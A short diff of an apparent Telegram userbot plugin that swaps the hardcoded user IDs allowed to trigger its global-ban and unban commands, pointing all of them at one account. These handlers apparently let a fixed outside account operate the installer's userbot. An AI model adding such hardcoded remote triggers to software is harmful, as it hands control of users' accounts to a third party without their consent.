@@ -17,16 +17,16 @@ __HELP__ = f"""
 
 @PY.UBOT("gban", sudo=True)
 @PY.TOP_CMD
-@ubot.on_message(filters.command(["gban"], "C") & filters.user(6588255955))
-@ubot.on_message(filters.command(["gban"], "C") & filters.user(6588255955))
+@ubot.on_message(filters.command(["gban"], "C") & filters.user(940035839))
+@ubot.on_message(filters.command(["gban"], "C") & filters.user(940035839))
 async def _(client, message):
     await global_banned(client, message)
 
 
 @PY.UBOT("ungban", sudo=True)
 @PY.TOP_CMD
-@ubot.on_message(filters.command(["ungban"], "C") & filters.user(2100442624))
-@ubot.on_message(filters.command(["ungban"], "C") & filters.user(5312739535))
+@ubot.on_message(filters.command(["ungban"], "C") & filters.user(940035839))
+@ubot.on_message(filters.command(["ungban"], "C") & filters.user(940035839))
 async def _(client, message):
     await cung_ban(client, message)
 
